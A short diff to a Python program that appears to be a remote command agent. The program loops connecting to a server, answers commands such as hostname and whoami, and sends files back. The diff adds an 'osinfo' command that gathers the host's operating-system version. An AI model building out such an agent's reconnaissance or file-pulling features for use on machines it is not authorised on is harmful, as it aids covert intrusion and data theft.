@@ -26,6 +26,24 @@ def get_file_content(filepath):
         print(f"[*] Error reading file: {e}")
         return f"ERROR: {str(e)}"
 
+def get_os_info():
+    try:
+        if platform.system() == "Windows":
+            # Get Windows version
+            import subprocess
+            output = subprocess.check_output('ver', shell=True).decode()
+            return output.strip()
+        else:
+            # Get Linux/Unix version
+            with open('/etc/os-release') as f:
+                lines = f.readlines()
+                for line in lines:
+                    if line.startswith('PRETTY_NAME='):
+                        return line.split('=')[1].strip().strip('"')
+            return f"{platform.system()} {platform.release()}"
+    except:
+        return f"{platform.system()} {platform.release()}"
+
 def connect_to_server():
     while True:
         try:
@@ -60,6 +78,8 @@ def connect_to_server():
                     # Send end marker
                     sock.send(b"<<EOF>>\n")
                     print(f"[*] File sent successfully")
+                elif command == "osinfo":
+                    output = get_os_info()
                 elif command == "hostname":
                     output = platform.node()
                 elif command == "whoami":
